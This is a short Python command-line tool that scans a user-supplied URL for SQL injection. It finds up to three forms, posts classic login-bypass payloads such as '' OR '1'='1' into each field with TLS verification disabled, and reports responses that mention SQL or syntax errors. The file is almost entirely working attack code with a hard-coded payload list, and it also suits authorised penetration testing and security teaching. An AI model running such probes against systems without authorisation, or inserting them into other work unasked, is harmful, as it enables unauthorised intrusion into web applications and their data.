import warnings
warnings.filterwarnings('ignore')
warnings.simplefilter('ignore')

import requests
import argparse
from bs4 import BeautifulSoup
from urllib.parse import urljoin
from suggestions import print_suggestions

requests.packages.urllib3.disable_warnings()

SQLI_PAYLOADS = ["' OR '1'='1", "' OR 1=1--", "admin' --", "' OR 'a'='a"]

def test_sqli(url):
    """Test for basic SQL injection."""
    print(f"[*] Testing for SQL injection on {url}")
    try:
        r = requests.get(url, timeout=10, verify=False)
        soup = BeautifulSoup(r.content, 'lxml')
        forms = soup.find_all('form')
        
        if not forms:
            print("[-] No forms found to test.")
            return
        
        for form in forms[:3]:  # Test first 3 forms
            action = form.get('action', '')
            post_url = urljoin(url, action)
            inputs = form.find_all(['input', 'textarea'])
            
            for inp in inputs:
                name = inp.get('name')
                if name:
                    for payload in SQLI_PAYLOADS:
                        data = {name: payload}
                        try:
                            res = requests.post(post_url, data=data, timeout=5)
                            if 'sql' in res.text.lower() or 'syntax' in res.text.lower():
                                finding = f"VULNERABILITY: Potential SQLi in {name}"
                                print(f"[+] {finding}")
                                print_suggestions(finding)
                        except Exception:
                            pass
    
    except Exception as e:
        print(f"Error: {e}")

def main():
    parser = argparse.ArgumentParser(description="Test for SQL injection.")
    parser.add_argument("url", help="Target URL or domain (e.g., example.com)")
    args = parser.parse_args()
    
    target = args.url if '://' in args.url else 'http://' + args.url
    test_sqli(target)

if __name__ == "__main__":
    main()
